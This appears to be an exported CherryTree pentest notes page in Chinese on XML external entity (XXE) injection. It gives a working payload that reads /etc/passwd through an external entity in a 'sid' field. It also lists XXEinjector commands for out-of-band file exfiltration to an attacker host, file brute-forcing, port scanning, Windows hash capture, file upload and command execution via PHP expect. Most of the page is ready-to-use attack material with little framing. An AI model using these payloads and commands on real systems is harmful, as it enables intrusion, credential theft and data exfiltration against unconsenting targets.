<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>XXE自动脚本</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>XXE自动脚本</h1><br/>就是xml注入漏洞<br />一个网站，访问时，post一段数据，这段数据是xml格式的<br /><br />此时在xml第一行版本下加入外部实体，一般是&lt;!DOCTYPE&gt;开头的，该实体中写入要执行的代码<br /><br />&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;<br /><br />&lt;!DOCTYPE ANY [<br />&lt;!ENTITY all SYSTEM &quot;file:///etc/passwd&quot;&gt;<br />]&gt;<br /><br />...<br />&lt;string name=&quot;sid&quot;&gt;&amp;all;&lt;/string&gt;<br />...<br /><br /><br />在正常的xml数据中引用上面的外部实例&amp;all，如果该参数sid存在漏洞，即可返回执行结果<br /><br /><br /><br /><br /><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\215-XXEinjector.rb">Linked file: XXEinjector.rb </a></td></tr></table><br /><br /><span style="color:#90ee90;">工具使用说明</span><br /><br />XXEinjector项目地址<br /><a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a><br />使用方法<br />列 /etc 目录 通过https:<br /><br />ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl<br />Enumerating /etc directory using gopher for OOB method:<br /><br />ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher<br />二次注入:<br /><br />ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt<br />通过http协议暴力枚举文件:<br /><br />ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc<br />直接枚举:<br /><br />ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK<br />枚举所有端口:<br />ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all<br /><br />获取windows hash:<br />ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes<br /><br />通过java的jar上传文件:<br />ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf<br /><br />执行系统命令使用 PHP expect:<br />ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls<br /><br />测试XSLT注入:<br />ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt<br /><br />记录请求日志:<br />ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>